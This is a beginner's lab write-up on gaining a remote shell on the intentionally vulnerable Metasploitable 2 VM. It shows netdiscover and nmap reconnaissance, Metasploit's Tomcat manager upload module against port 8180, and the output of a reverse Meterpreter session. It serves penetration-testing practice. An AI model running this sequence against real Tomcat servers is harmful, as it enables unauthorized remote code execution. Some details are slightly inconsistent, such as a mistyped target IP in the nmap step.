# Metasploitable 2 Apache exploit write-up

Metasploitable 2 is Virtual Machine with many exploitable ports and now we are going to exploit it's one of exploit - Apache.



 > The target of this lab is use vulnerablitity in **Apache** service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.126.0/16   |   Screen View: Unique Hosts                                                                                    
                                                                                                                                                         
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.95   00:0c:29:c8:07:4e      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

.
8180/tcp  open  http Apache Tomcat/Coyote JSP engine 1.1
.
.
```

We'll exploit this vulnerabilty using metasploit, `sudo msfdb init && msfconsole`


Search for **tomcat_mgr_upload** - this module help us in logging in remote machine.

`msf6 > search tomcat_mgr_upload`

```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_upload  2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
```

Using 0, look for it's options, `msf6 exploit(multi/http/tomcat_mgr_upload) > show options`

We need to set following using;

`set RHOSTS 192.168.43.95`

`set RPORT 8180`

## Exploitation:

Everything is now set, just run and it will open a terminal for us; 

```
*] Started reverse TCP handler on 192.168.43.132:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying 1TfQQwU...
[*] Executing 1TfQQwU...
[*] Undeploying 1TfQQwU ...
[*] Undeployed at /manager/html/undeploy
[*] Sending stage (57971 bytes) to 192.168.43.95
[*] Meterpreter session 1 opened (192.168.43.132:4444 -> 192.168.43.95:38817) at 2024-07-09 10:01:26 -0400

meterpreter > sysinfo
Computer        : metasploitable
OS              : Linux 2.6.24-16-server (i386)
Architecture    : x86
System Language : en_US
Meterpreter     : java/linux
```

Using **sysinfo**  we got to know that we have successfully logged in target machine.